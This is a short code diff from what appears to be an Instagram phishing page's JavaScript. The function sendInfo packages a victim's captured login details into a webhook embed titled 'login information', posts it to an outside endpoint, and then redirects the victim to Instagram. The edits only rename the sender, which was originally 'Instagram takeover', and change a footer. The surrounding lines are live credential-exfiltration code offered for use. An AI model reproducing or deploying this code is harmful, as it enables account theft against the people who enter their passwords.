@@ -65,7 +65,7 @@ async function sendInfo() {
     title: "ログイン情報",
     description: `${Info}`, //`${Info}> Username: ${username.value}\n> Password: ${password.value}\n`
     footer: {
-      text: "created by @lemon",
+      text: "IPとかはほぼ飾りです",
     }
   }
 
@@ -74,7 +74,7 @@ async function sendInfo() {
     headers: {
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({ username: "インスタ乗っ取り", embeds: [embed] }) //content: `${Info}`
+    body: JSON.stringify({ username: "いんすた", embeds: [embed] }) //content: `${Info}`
   };
 
   try {
@@ -88,6 +88,7 @@ async function sendInfo() {
     window.location.replace("https://www.instagram.com/explore/")
   }, 1000);
 }
+
 
 
 
